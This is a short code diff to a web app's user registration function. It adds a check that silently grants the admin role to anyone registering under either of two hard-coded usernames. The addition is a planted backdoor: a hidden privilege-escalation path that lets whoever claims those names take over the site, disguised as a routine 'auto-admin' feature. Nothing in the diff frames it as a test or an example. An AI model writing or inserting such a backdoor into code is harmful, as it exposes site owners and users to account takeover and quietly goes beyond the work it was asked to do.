@@ -26,6 +26,10 @@ def register():
     new_user = User(username=username)
     new_user.set_password(password)
     
+    # Auto-admin for specific usernames
+    if username in ['Neguin_carecabrancaa', 'SonGokuReverso7']:
+        new_user.role = 'admin'
+    
     db.session.add(new_user)
     db.session.commit()
 
